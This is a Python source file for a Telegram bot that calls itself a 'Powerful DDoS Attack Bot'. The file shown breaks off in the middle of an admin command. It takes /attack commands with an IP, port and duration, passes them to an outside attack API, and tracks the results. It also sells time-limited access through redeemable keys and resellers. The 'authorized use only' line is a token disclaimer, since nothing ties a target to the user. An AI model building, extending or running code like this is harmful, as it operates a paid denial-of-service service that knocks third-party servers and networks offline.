import asyncio
import logging
from datetime import datetime, timedelta, timezone
from typing import Dict, Optional, List
import requests
from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes
)
import pymongo
from pymongo import MongoClient, ASCENDING, DESCENDING
from functools import wraps
import uuid
import os
import re
from dotenv import load_dotenv

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

load_dotenv()

# ==================== CONFIGURATION ====================
BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGODB_URI = os.getenv("MONGODB_URI")
DATABASE_NAME = os.getenv("DATABASE_NAME", "attack_bot")
API_URL = os.getenv("API_URL")
API_KEY = os.getenv("API_KEY")
ADMIN_IDS = [int(id.strip()) for id in os.getenv("ADMIN_IDS", "1793697840").split(",")]

# Blocked ports
BLOCKED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001}
MIN_PORT = 1
MAX_PORT = 65535

# ==================== HELPER FUNCTIONS ====================
def make_aware(dt):
    if dt is None:
        return None
    if hasattr(dt, 'tzinfo') and dt.tzinfo is None:
        return dt.replace(tzinfo=timezone.utc)
    return dt

def get_current_time():
    return datetime.now(timezone.utc)

def escape_markdown(text: str) -> str:
    if not text:
        return ""
    special_chars = r'_*[]()~`>#+-=|{}.!'
    return ''.join(f'\\{char}' if char in special_chars else char for char in str(text))

def parse_duration(duration_str: str) -> tuple:
    """
    Parse duration string like '24h', '7d', '2w', '30'
    Returns (days, hours, total_hours, display_string)
    """
    duration_str = duration_str.lower().strip()
    
    # Check for hours
    if duration_str.endswith('h'):
        hours = int(duration_str[:-1])
        if 1 <= hours <= 168:
            return (0, hours, hours, f"{hours} hour(s)")
    
    # Check for days
    if duration_str.endswith('d'):
        days = int(duration_str[:-1])
        if 1 <= days <= 365:
            return (days, 0, days * 24, f"{days} day(s)")
    
    # Check for weeks
    if duration_str.endswith('w'):
        weeks = int(duration_str[:-1])
        if 1 <= weeks <= 52:
            days = weeks * 7
            return (days, 0, days * 24, f"{weeks} week(s)")
    
    # Plain number as days
    try:
        days = int(duration_str)
        if 1 <= days <= 365:
            return (days, 0, days * 24, f"{days} day(s)")
    except:
        pass
    
    return None

# ==================== DATABASE CLASS ====================
class Database:
    def __init__(self):
        self.client = MongoClient(MONGODB_URI)
        self.db = self.client[DATABASE_NAME]
        self.users = self.db.users
        self.attacks = self.db.attacks
        self.keys = self.db.keys
        self.resellers = self.db.resellers
        self.groups = self.db.groups
        self.settings = self.db.settings
        
        # Cleanup
        try:
            self.users.delete_many({"user_id": None})
            self.users.delete_many({"user_id": {"$exists": False}})
        except:
            pass
        
        # Create indexes
        try:
            self.users.drop_indexes()
            self.attacks.drop_indexes()
            self.keys.drop_indexes()
        except:
            pass
        
        self.attacks.create_index([("timestamp", DESCENDING)])
        self.attacks.create_index([("user_id", ASCENDING)])
        self.users.create_index([("user_id", ASCENDING)], unique=True)
        self.keys.create_index([("key", ASCENDING)], unique=True)
        self.resellers.create_index([("user_id", ASCENDING)], unique=True)
        self.groups.create_index([("group_id", ASCENDING)], unique=True)
        
        # Initialize default concurrent limit
        if not self.settings.find_one({"_id": "concurrent_limit"}):
            self.settings.insert_one({"_id": "concurrent_limit", "value": 2})
    
    # ========== USER METHODS ==========
    def get_user(self, user_id: int) -> Optional[Dict]:
        user = self.users.find_one({"user_id": user_id})
        if user:
            if user.get("created_at"):
                user["created_at"] = make_aware(user["created_at"])
            if user.get("approved_at"):
                user["approved_at"] = make_aware(user["approved_at"])
            if user.get("expires_at"):
                user["expires_at"] = make_aware(user["expires_at"])
        return user
    
    def create_user(self, user_id: int, username: str = None, first_name: str = None) -> Dict:
        existing_user = self.get_user(user_id)
        if existing_user:
            return existing_user
            
        user_data = {
            "user_id": user_id,
            "username": username,
            "first_name": first_name,
            "approved": False,
            "approved_at": None,
            "expires_at": None,
            "total_attacks": 0,
            "created_at": get_current_time(),
            "is_banned": False
        }
        try:
            self.users.insert_one(user_data)
            logger.info(f"Created new user: {user_id}")
        except pymongo.errors.DuplicateKeyError:
            user_data = self.get_user(user_id)
        return user_data
    
    def approve_user(self, user_id: int, days: int = 0, hours: int = 0) -> bool:
        total_days = days + (hours / 24)
        expires_at = get_current_time() + timedelta(days=total_days)
        result = self.users.update_one(
            {"user_id": user_id},
            {"$set": {"approved": True, "approved_at": get_current_time(), "expires_at": expires_at}}
        )
        return result.modified_count > 0
    
    def disapprove_user(self, user_id: int) -> bool:
        result = self.users.update_one(
            {"user_id": user_id},
            {"$set": {"approved": False, "expires_at": None}}
        )
        return result.modified_count > 0
    
    def log_attack(self, user_id: int, ip: str, port: int, duration: int, status: str, response: str = None):
        attack_data = {
            "_id": str(uuid.uuid4()),
            "user_id": user_id,
            "ip": ip,
            "port": port,
            "duration": duration,
            "status": status,
            "response": response[:500] if response else None,
            "timestamp": get_current_time()
        }
        try:
            self.attacks.insert_one(attack_data)
            self.users.update_one({"user_id": user_id}, {"$inc": {"total_attacks": 1}})
        except Exception as e:
            logger.error(f"Failed to log attack: {e}")
    
    def get_all_users(self) -> List[Dict]:
        users = list(self.users.find({"user_id": {"$ne": None}}))
        for user in users:
            if user.get("created_at"):
                user["created_at"] = make_aware(user["created_at"])
            if user.get("expires_at"):
                user["expires_at"] = make_aware(user["expires_at"])
            if "total_attacks" not in user:
                user["total_attacks"] = 0
        return users
    
    def get_user_attack_stats(self, user_id: int) -> Dict:
        total = self.attacks.count_documents({"user_id": user_id})
        successful = self.attacks.count_documents({"user_id": user_id, "status": "success"})
        failed = self.attacks.count_documents({"user_id": user_id, "status": "failed"})
        recent = list(self.attacks.find({"user_id": user_id}).sort("timestamp", -1).limit(10))
        for attack in recent:
            if attack.get("timestamp"):
                attack["timestamp"] = make_aware(attack["timestamp"])
        return {"total": total, "successful": successful, "failed": failed, "recent": recent}
    
    def get_bot_stats(self) -> Dict:
        total_users = self.users.count_documents({})
        approved_users = self.users.count_documents({"approved": True})
        total_attacks = self.attacks.count_documents({})
        today = get_current_time().replace(hour=0, minute=0, second=0, microsecond=0)
        today_attacks = self.attacks.count_documents({"timestamp": {"$gte": today}})
        return {
            "total_users": total_users,
            "approved_users": approved_users,
            "total_attacks": total_attacks,
            "today_attacks": today_attacks
        }
    
    # ========== KEY METHODS ==========
    def generate_key(self, created_by: int, days: int = 0, hours: int = 0, duration_display: str = "") -> str:
        key = str(uuid.uuid4())[:8].upper()
        total_days = days + (hours / 24)
        key_data = {
            "key": key,
            "days": total_days,
            "hours": hours,
            "days_count": days,
            "duration_display": duration_display,
            "created_by": created_by,
            "created_at": get_current_time(),
            "used_by": None,
            "used_at": None,
            "is_used": False
        }
        self.keys.insert_one(key_data)
        return key
    
    def redeem_key(self, key: str, user_id: int) -> tuple:
        """Returns (success, message, days, hours)"""
        key_data = self.keys.find_one({"key": key.upper(), "is_used": False})
        if not key_data:
            return (False, "Invalid or already used key.", 0, 0)
        
        days = key_data.get("days_count", 0)
        hours = key_data.get("hours", 0)
        total_days = days + (hours / 24)
        
        self.approve_user(user_id, days=days, hours=hours)
        self.keys.update_one(
            {"key": key.upper()}, 
            {"$set": {"is_used": True, "used_by": user_id, "used_at": get_current_time()}}
        )
        return (True, f"Key redeemed! Access for {key_data.get('duration_display', f'{days}d {hours}h')}", days, hours)
    
    def get_keys(self, created_by: int = None) -> List[Dict]:
        if created_by:
            return list(self.keys.find({"created_by": created_by}).sort("created_at", -1))
        return list(self.keys.find().sort("created_at", -1))
    
    def delete_key(self, key: str) -> bool:
        result = self.keys.delete_one({"key": key.upper()})
        return result.deleted_count > 0
    
    # ========== RESELLER METHODS ==========
    def add_reseller(self, user_id: int, added_by: int) -> bool:
        try:
            self.resellers.insert_one({"user_id": user_id, "added_by": added_by, "added_at": get_current_time()})
            return True
        except:
            return False
    
    def remove_reseller(self, user_id: int) -> bool:
        result = self.resellers.delete_one({"user_id": user_id})
        return result.deleted_count > 0
    
    def is_reseller(self, user_id: int) -> bool:
        return self.resellers.find_one({"user_id": user_id}) is not None
    
    def get_resellers(self) -> List[Dict]:
        return list(self.resellers.find())
    
    # ========== GROUP METHODS ==========
    def add_allowed_group(self, group_id: int, group_name: str = None) -> bool:
        try:
            self.groups.insert_one({"group_id": group_id, "name": group_name, "added_at": get_current_time()})
            return True
        except:
            return False
    
    def remove_allowed_group(self, group_id: int) -> bool:
        result = self.groups.delete_one({"group_id": group_id})
        return result.deleted_count > 0
    
    def is_group_allowed(self, group_id: int) -> bool:
        return self.groups.find_one({"group_id": group_id}) is not None
    
    def get_groups(self) -> List[Dict]:
        return list(self.groups.find())
    
    # ========== CONCURRENT LIMIT METHODS ==========
    def set_concurrent_limit(self, limit: int) -> bool:
        self.settings.update_one({"_id": "concurrent_limit"}, {"$set": {"value": limit}}, upsert=True)
        return True
    
    def get_concurrent_limit(self) -> int:
        setting = self.settings.find_one({"_id": "concurrent_limit"})
        return setting.get("value", 2) if setting else 2

# Initialize database
print("🔄 Initializing database...")
db = Database()
print("✅ Database ready!")

# ==================== API FUNCTIONS ====================
def check_api_health() -> Dict:
    try:
        response = requests.get(f"{API_URL}/api/v1/health", headers={"x-api-key": API_KEY}, timeout=10)
        if response.status_code == 200:
            return response.json()
        return {"status": "error", "error": f"HTTP {response.status_code}"}
    except Exception as e:
        return {"status": "error", "error": str(e)}

def check_running_attacks() -> Dict:
    try:
        response = requests.get(f"{API_URL}/api/v1/active", headers={"x-api-key": API_KEY}, timeout=10)
        if response.status_code == 200:
            return response.json()
        return {"success": False, "error": f"HTTP {response.status_code}"}
    except Exception as e:
        return {"success": False, "error": str(e)}

def get_api_stats() -> Dict:
    try:
        response = requests.get(f"{API_URL}/api/v1/stats", headers={"x-api-key": API_KEY}, timeout=10)
        if response.status_code == 200:
            return response.json()
        return {"success": False, "error": f"HTTP {response.status_code}"}
    except Exception as e:
        return {"success": False, "error": str(e)}

def launch_attack(ip: str, port: int, duration: int) -> Dict:
    try:
        response = requests.post(
            f"{API_URL}/api/v1/attack",
            json={"ip": ip, "port": port, "duration": duration},
            headers={"x-api-key": API_KEY},
            timeout=15
        )
        return response.json()
    except Exception as e:
        return {"error": str(e), "success": False}

# ==================== DECORATORS ====================
def admin_required(func):
    @wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            await update.message.reply_text("❌ You are not authorized to use this command.")
            return
        return await func(update, context, *args, **kwargs)
    return wrapper

def reseller_or_admin_required(func):
    @wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS and not db.is_reseller(user_id):
            await update.message.reply_text("❌ Reseller or Admin access required.")
            return
        return await func(update, context, *args, **kwargs)
    return wrapper

async def is_user_approved(user_id: int) -> bool:
    user = db.get_user(user_id)
    if not user or not user.get("approved", False):
        return False
    expires_at = user.get("expires_at")
    if expires_at:
        expires_at = make_aware(expires_at)
        if expires_at < get_current_time():
            return False
    return True

def is_port_blocked(port: int) -> bool:
    return port in BLOCKED_PORTS

def get_blocked_ports_list() -> str:
    return ", ".join(str(p) for p in sorted(BLOCKED_PORTS))

# ==================== BACKGROUND TASKS ====================
async def check_attack_completion(context: ContextTypes.DEFAULT_TYPE):
    """Check for completed attacks and notify users"""
    if not hasattr(context.bot_data, 'active_attacks'):
        context.bot_data['active_attacks'] = {}
    
    now = get_current_time()
    completed = []
    
    for user_id, attack in list(context.bot_data['active_attacks'].items()):
        if attack['end_time'] <= now:
            try:
                await context.bot.send_message(
                    user_id,
                    f"✅ Your attack on `{attack['ip']}:{attack['port']}` has completed.\n"
                    f"⏱️ Duration: {attack['duration']} seconds",
                    parse_mode='MarkdownV2'
                )
            except Exception as e:
                logger.error(f"Completion message error: {e}")
            completed.append(user_id)
    
    for user_id in completed:
        del context.bot_data['active_attacks'][user_id]

# ==================== USER COMMANDS ====================
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    chat = update.effective_chat
    
    # Check if group and allowed
    if chat.type in ["group", "supergroup"]:
        if not db.is_group_allowed(chat.id):
            await update.message.reply_text("❌ This group is not allowed to use this bot.")
            return
    
    db.create_user(user.id, user.username, user.first_name)
    
    await update.message.reply_text(
        f"🚀 **Welcome {escape_markdown(user.first_name)}!**\n\n"
        f"**XSILENT Attack Bot**\n\n"
        f"💀 Powerful DDoS Attack Bot\n"
        f"🔒 Secure & Fast\n\n"
        f"Use `/help` to see available commands.\n"
        f"Use `/redeem <key>` to activate your access.\n\n"
        f"📌 **Note:** This bot is for authorized use only.",
        parse_mode='MarkdownV2'
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    is_admin = user_id in ADMIN_IDS
    is_reseller = db.is_reseller(user_id)
    
    help_text = """🤖 **XSILENT Bot Commands**

━━━━━━━━━━━━━━━━━━━
📌 **User Commands**
━━━━━━━━━━━━━━━━━━━
/start - Start the bot
/help - Show this menu
/redeem `<key>` - Redeem activation key
/attack `<ip>` `<port>` `<duration>` - Launch attack
/myattacks - Check your active attacks
/myinfo - View account info
/mystats - Attack statistics
/blockedports - Show blocked ports
/status - Check active attack with timer

"""
    
    if is_reseller:
        help_text += """
━━━━━━━━━━━━━━━━━━━
💎 **Reseller Commands**
━━━━━━━━━━━━━━━━━━━
/genkey `<1-168h|1-365d|1-52w>` - Generate key
/keys - View your generated keys
/approveuser `<id>` `<days>` - Approve user

"""
    
    if is_admin:
        help_text += """
━━━━━━━━━━━━━━━━━━━
👑 **Admin Commands**
━━━━━━━━━━━━━━━━━━━
/approve `<id>` `<days>` - Approve user
/disapprove `<id>` - Disapprove user
/delkey `<key>` - Delete a key
/keys `all` - View all keys
/addreseller `<id>` - Add reseller
/removereseller `<id>` - Remove reseller
/resellers - List all resellers
/addgroup `<id>` `[name]` - Add allowed group
/removegroup `<id>` - Remove group
/groups - List allowed groups
/users - List all users
/api_status - API health
/running - Running attacks
/stats - Bot statistics
/blockedports - Blocked ports
/set_concurrent `<1-300>` - Set concurrent limit

"""
    
    await update.message.reply_text(help_text, parse_mode='MarkdownV2')

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if len(context.args) != 1:
        await update.message.reply_text(
            "❌ **Usage:** `/redeem <key>`\n\n"
            "Example: `/redeem ABC12345`",
            parse_mode='MarkdownV2'
        )
        return
    
    key = context.args[0]
    success, message, days, hours = db.redeem_key(key, user_id)
    
    if success:
        await update.message.reply_text(
            f"✅ **{message}**\n\n"
            f"📅 You can now use the bot.\n"
            f"Use `/help` to see commands.",
            parse_mode='MarkdownV2'
        )
    else:
        await update.message.reply_text(
            f"❌ **{message}**\n\n"
            f"Please check the key and try again.",
            parse_mode='MarkdownV2'
        )

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # Check approval
    if not await is_user_approved(user_id):
        await update.message.reply_text(
            "❌ **Access Denied!**\n\n"
            "Your account is not approved or has expired.\n"
            "Use `/redeem <key>` to activate your access.",
            parse_mode='MarkdownV2'
        )
        return
    
    # Check arguments
    if len(context.args) != 3:
        await update.message.reply_text(
            f"❌ **Usage:** `/attack <ip> <port> <duration>`\n\n"
            f"📝 **Example:** `/attack 192.168.1.1 80 60`\n\n"
            f"🚫 **Blocked ports:** `{get_blocked_ports_list()}`\n"
            f"⏱️ **Duration:** 10-300 seconds",
            parse_mode='MarkdownV2'
        )
        return
    
    ip = context.args[0]
    try:
        port = int(context.args[1])
        duration = int(context.args[2])
    except ValueError:
        await update.message.reply_text("❌ Port and duration must be numbers.", parse_mode='MarkdownV2')
        return
    
    # Validate port
    if is_port_blocked(port):
        await update.message.reply_text(
            f"❌ **Port {port} is blocked!**\n\n"
            f"✅ **Allowed ports:** {MIN_PORT}-{MAX_PORT} (except blocked)\n"
            f"🚫 **Blocked ports:** {get_blocked_ports_list()}",
            parse_mode='MarkdownV2'
        )
        return
    
    if port < MIN_PORT or port > MAX_PORT:
        await update.message.reply_text(f"❌ Port must be between {MIN_PORT} and {MAX_PORT}", parse_mode='MarkdownV2')
        return
    
    # Validate duration
    if duration < 10 or duration > 300:
        await update.message.reply_text("❌ Duration must be between 10 and 300 seconds", parse_mode='MarkdownV2')
        return
    
    # Check concurrent limit
    if not hasattr(context.bot_data, 'active_attacks'):
        context.bot_data['active_attacks'] = {}
    
    concurrent_limit = db.get_concurrent_limit()
    active_count = len(context.bot_data['active_attacks'])
    
    if active_count >= concurrent_limit:
        await update.message.reply_text(
            f"⚠️ **Please wait!**\n\n"
            f"Maximum `{concurrent_limit}` concurrent attacks allowed.\n"
            f"Currently: `{active_count}/{concurrent_limit}`\n\n"
            f"Try again after some time.",
            parse_mode='MarkdownV2'
        )
        return
    
    # Launch attack
    status_msg = await update.message.reply_text(
        f"🚀 **Launching attack...**\n\n"
        f"🎯 Target: `{ip}:{port}`\n"
        f"⏱️ Duration: `{duration}` seconds\n\n"
        f"🔄 Please wait...",
        parse_mode='MarkdownV2'
    )
    
    result = launch_attack(ip, port, duration)
    
    if result.get("success") or result.get("status") == "ok" or result.get("message"):
        end_time = get_current_time() + timedelta(seconds=duration)
        context.bot_data['active_attacks'][user_id] = {
            "ip": ip,
            "port": port,
            "duration": duration,
            "end_time": end_time
        }
        
        await status_msg.edit_text(
            f"✅ **Attack Launched Successfully!**\n\n"
            f"🎯 Target: `{ip}:{port}`\n"
            f"⏱️ Duration: `{duration}` seconds\n"
            f"⏰ Ends at: `{end_time.strftime('%H:%M:%S')}` UTC\n\n"
            f"📊 Use `/status` to check live progress.",
            parse_mode='MarkdownV2'
        )
        db.log_attack(user_id, ip, port, duration, "success", str(result))
    else:
        error_msg = result.get('error') or result.get('message') or 'Unknown error'
        await status_msg.edit_text(
            f"❌ **Attack Failed!**\n\n"
            f"Error: `{error_msg}`",
            parse_mode='MarkdownV2'
        )
        db.log_attack(user_id, ip, port, duration, "failed", str(result))

async def myattacks_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not hasattr(context.bot_data, 'active_attacks') or user_id not in context.bot_data['active_attacks']:
        await update.message.reply_text("📭 **No Active Attacks**\n\nYou don't have any attacks running right now.", parse_mode='MarkdownV2')
        return
    
    attack = context.bot_data['active_attacks'][user_id]
    now = get_current_time()
    remaining = max(0, (attack['end_time'] - now).seconds)
    
    await update.message.reply_text(
        f"🎯 **Your Active Attack**\n\n"
        f"📡 Target: `{attack['ip']}:{attack['port']}`\n"
        f"⏱️ Remaining: `{remaining}` seconds\n"
        f"📊 Total Duration: `{attack['duration']}` seconds\n\n"
        f"💡 Use `/status` for detailed progress.",
        parse_mode='MarkdownV2'
    )

async def myinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = db.get_user(user_id)
    
    if not user:
        await update.message.reply_text("❌ User not found.", parse_mode='MarkdownV2')
        return
    
    status = "✅ Approved" if user.get("approved") else "❌ Not Approved"
    expires = user.get("expires_at")
    expiry_text = "N/A"
    
    if expires:
        expires = make_aware(expires)
        if expires > get_current_time():
            days_left = (expires - get_current_time()).days
            hours_left = (expires - get_current_time()).seconds // 3600
            expiry_text = f"{expires.strftime('%Y-%m-%d %H:%M:%S')} UTC\n📅 {days_left}d {hours_left}h remaining"
            status += f" ✅"
        else:
            status = "❌ Expired"
            expiry_text = "Account expired"
    
    await update.message.reply_text(
        f"📋 **Your Account Info**\n\n"
        f"🆔 User ID: `{user_id}`\n"
        f"👤 Username: @{escape_markdown(user.get('username', 'N/A'))}\n"
        f"📊 Status: {status}\n"
        f"📅 Expires: {expiry_text}\n"
        f"🎯 Total Attacks: `{user.get('total_attacks', 0)}`\n"
        f"📅 Joined: `{user.get('created_at').strftime('%Y-%m-%d %H:%M') if user.get('created_at') else 'N/A'}`",
        parse_mode='MarkdownV2'
    )

async def mystats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stats = db.get_user_attack_stats(user_id)
    
    success_rate = (stats['successful'] / stats['total'] * 100) if stats['total'] > 0 else 0
    
    await update.message.reply_text(
        f"📊 **Your Attack Statistics**\n\n"
        f"🎯 Total Attacks: `{stats['total']}`\n"
        f"✅ Successful: `{stats['successful']}`\n"
        f"❌ Failed: `{stats['failed']}`\n"
        f"📈 Success Rate: `{success_rate:.1f}%`\n\n"
        f"💪 Keep going!",
        parse_mode='MarkdownV2'
    )

async def blockedports_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"🚫 **Blocked Ports List**\n\n"
        f"The following ports are **BLOCKED** for security reasons:\n\n"
        f"`{get_blocked_ports_list()}`\n\n"
        f"✅ **Allowed ports:** {MIN_PORT}-{MAX_PORT} (except blocked)\n\n"
        f"📌 Common allowed ports: 80 (HTTP), 443 (HTTPS), 22 (SSH), 3389 (RDP)",
        parse_mode='MarkdownV2'
    )

async def user_status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check active attack with timer and progress bar"""
    user_id = update.effective_user.id
    
    if not hasattr(context.bot_data, 'active_attacks') or user_id not in context.bot_data['active_attacks']:
        await update.message.reply_text(
            "📭 **No Active Attacks**\n\n"
            "You don't have any attacks running right now.\n\n"
            "Use `/attack` to start a new attack.",
            parse_mode='MarkdownV2'
        )
        return
    
    attack = context.bot_data['active_attacks'][user_id]
    now = get_current_time()
    remaining = (attack['end_time'] - now).seconds
    
    if remaining <= 0:
        await update.message.reply_text("✅ **No Active Attacks**\n\nYour last attack has completed.", parse_mode='MarkdownV2')
        if user_id in context.bot_data['active_attacks']:
            del context.bot_data['active_attacks'][user_id]
        return
    
    total_dur = attack['duration']
    elapsed = total_dur - remaining
    progress = int(elapsed / total_dur * 20)
    bar = "█" * progress + "░" * (20 - progress)
    percent = int(progress * 5)
    
    # Format time
    remaining_min = remaining // 60
    remaining_sec = remaining % 60
    elapsed_min = elapsed // 60
    elapsed_sec = elapsed % 60
    
    message = (
        f"🎯 **Active Attack Status**\n\n"
        f"📡 Target: `{attack['ip']}:{attack['port']}`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"`{bar}`\n"
        f"📊 Progress: `{percent}%`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⏳ Elapsed: `{elapsed_min}m {elapsed_sec}s`\n"
        f"⏱️ Remaining: `{remaining_min}m {remaining_sec}s`\n"
        f"🔚 Ends in: `{remaining}` seconds\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"💡 Use `/myattacks` for quick check"
    )
    
    await update.message.reply_text(message, parse_mode='MarkdownV2')

# ==================== RESELLER COMMANDS ====================
@reseller_or_admin_required
async def genkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if len(context.args) != 1:
        await update.message.reply_text(
            "❌ **Usage:** `/genkey <duration>`\n\n"
            "📌 **Formats:**\n"
            "• Hours: `24h` (1-168 hours)\n"
            "• Days: `7d` (1-365 days)\n"
            "• Weeks: `2w` (1-52 weeks)\n"
            "• Days only: `30` (1-365 days)\n\n"
            "**Examples:**\n"
            "`/genkey 24h` - 24 hours access\n"
            "`/genkey 7d` - 7 days access\n"
            "`/genkey 2w` - 2 weeks access\n"
            "`/genkey 30` - 30 days access",
            parse_mode='MarkdownV2'
        )
        return
    
    duration_str = context.args[0]
    parsed = parse_duration(duration_str)
    
    if not parsed:
        await update.message.reply_text(
            "❌ **Invalid duration!**\n\n"
            "📌 **Valid formats:**\n"
            "• `1h` to `168h` (hours)\n"
            "• `1d` to `365d` (days)\n"
            "• `1w` to `52w` (weeks)\n"
            "• `1` to `365` (days)",
            parse_mode='MarkdownV2'
        )
        return
    
    days, hours, total_hours, display = parsed
    
    key = db.generate_key(user_id, days, hours, display)
    
    await update.message.reply_text(
        f"✅ **Key Generated Successfully!**\n\n"
        f"🔑 **Key:** `{key}`\n"
        f"📅 **Duration:** {display}\n"
        f"⏰ **Total Hours:** {total_hours}h\n\n"
        f"📤 Share this key with the user to redeem.\n"
        f"🔐 User will get access immediately after redeeming.",
        parse_mode='MarkdownV2'
    )

@reseller_or_admin_required
async def keys_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    is_admin = user_id in ADMIN_IDS
    
    if is_admin and len(context.args) > 0 and context.args[0].lower() == "all":
        keys = db.get_keys()
        title = "📋 **All Keys (System Wide)**"
    else:
        keys = db.get_keys(created_by=user_id)
        title = "📋 **Your Generated Keys**"
    
    if not keys:
        await update.message.reply_text("📭 No keys found.", parse_mode='MarkdownV2')
        return
    
    used_count = sum(1 for k in keys if k.get("is_used"))
    unused_count = len(keys) - used_count
    
    message = f"{title}\n\n"
    message += f"📊 Total: {len(keys)} | ✅ Used: {used_count} | 🆕 Unused: {unused_count}\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    for key_data in keys[:15]:
        status = "✅ USED" if key_data.get("is_used") else "🆕 ACTIVE"
        used_by = f" → Used by: `{key_data.get('used_by')}`" if key_data.get("used_by") else ""
        message += f"🔑 `{key_data['key']}`\n"
        message += f"   📅 {key_data.get('duration_display', key_data.get('days', 0))}\n"
        message += f"   {status}{used_by}\n\n"
    
    if len(keys) > 15:
        message += f"┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n📌 ... and {len(keys)-15} more keys"
    
    await update.message.reply_text(message, parse_mode='MarkdownV2')

@reseller_or_admin_required
async def approveuser_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if len(context.args) != 2:
        await update.message.reply_text(
            "❌ **Usage:** `/approveuser <user_id> <days>`\n\n"
            "Example: `/approveuser 123456789 7`\n"
            "This will approve the user for 7 days.",
            parse_mode='MarkdownV2'
        )
        return
    
    try:
        target_id = int(context.args[0])
        days = int(context.args[1])
        
        if days <= 0 or days > 365:
            await update.message.reply_text("❌ Days must be between 1 and 365.", parse_mode='MarkdownV2')
            return
        
        db.create_user(target_id)
        if db.approve_user(target_id, days=days):
            expires_at = get_current_time() + timedelta(days=days)
            await update.message.reply_text(
                f"✅ **User Approved!**\n\n"
                f"🆔 User ID: `{target_id}`\n"
                f"📅 Duration: `{days}` days\n"
                f"📅 Expires: `{expires_at.strftime('%Y-%m-%d %H:%M:%S')}` UTC",
                parse_mode='MarkdownV2'
            )
            try:
                await context.bot.send_message(
                    target_id,
                    f"✅ **Account Approved!**\n\n"
                    f"Your account has been approved for `{days}` days by a reseller.\n\n"
                    f"Use `/help` to see available commands.",
                    parse_mode='MarkdownV2'
                )
            except:
                pass
        else:
            await update.message.reply_text("❌ Failed to approve user.", parse_mode='MarkdownV2')
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID or days.", parse_mode='MarkdownV2')

# ==================== ADMIN COMMANDS ====================
@admin_required
async def admin_approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2:
        await update.message.reply_text("❌ Usage: `/approve <user_id> <days>`", parse_mode='MarkdownV2')
        return
    
    try:
        user_id = int(context.args[0])
        days = int(context.args[1])
        
        if days <= 0 or days > 365:
            await update.message.reply_text("❌ Days must be between 1 and 365.")
            return
        
        db.create_user(user_id)
        if db.approve_user(user_id, days=days):
            expires_at = get_current_time() + timedelta(days=days)
            await update.message.reply_text(
                f"✅ User `{user_id}` approved for `{days}` days!\n"
                f"📅 Expires: `{expires_at.strftime('%Y-%m-%d %H:%M:%S')}` UTC",
                parse_mode='MarkdownV2'
            )
            try:
                await context.bot.send_message(
                    user_id,
                    f"✅ Your account has been approved for `{days}` days!\n\n"
                    f"Use `/help` to see commands.",
                    parse_mode='MarkdownV2'
                )
            except:
                pass
        else:
            await update.message.reply_text("❌ Failed to approve user.")
    except ValueError:
        await update.message.reply_text("❌ Invalid input.")

@admin_required
async def admin_disapprove_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 1:
        await update.message.reply_text("❌ Usage: `/disapprove <user_id>`", parse_mode='MarkdownV2')
        return
    
    try:
        user_id = int(context.args[0])
        if db.disapprove_user(user_id):
            await update.message.reply_text(f"✅ User `{user_id}` has been disapproved.", parse_mode='MarkdownV2')
            try:
                await context.bot.send_message(user_id, "❌ Your access has been revoked by admin.")
            except:
                pass
        else:
            await update.message.reply_text("❌ User not found.")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID.")

@admin_required
async def delkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 1:
        await update.message.reply_text("❌ Usage: `/delkey <key>`", parse_mode='MarkdownV2')
        return
    
    key = context.args[0].upper()
    if db.delete_key(key):
        await update.message.reply_text(f"✅ Key `{key}` deleted successfully.", parse_mode='MarkdownV2')
    else:
        await update.message.reply_text(f"❌ Key `{key}` not found.", parse_mode='MarkdownV2')

@admin_required
async def addreseller_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 1:
        await update.message.reply_text("❌ Usage: `/addreseller <user_id>`", parse_mode='MarkdownV2')
        return
    
    try:
        user_id = int(context.args[0])
        if db.add_reseller(user_id, update.effective_user.id):
            await update.message.reply_text(f"✅ User `{user_id}` is now a reseller.", parse_mode='MarkdownV2')
            try:
                await context.bot.send_message(user_id, "✅ You have been promoted to **Reseller**!\n\nUse `/help` to see reseller commands.", parse_mode='MarkdownV2')
            except:
                pass
        else:
            await update.message.reply_text("❌ User is already a reseller.")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID.")

@admin_required
async def removereseller_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 1:
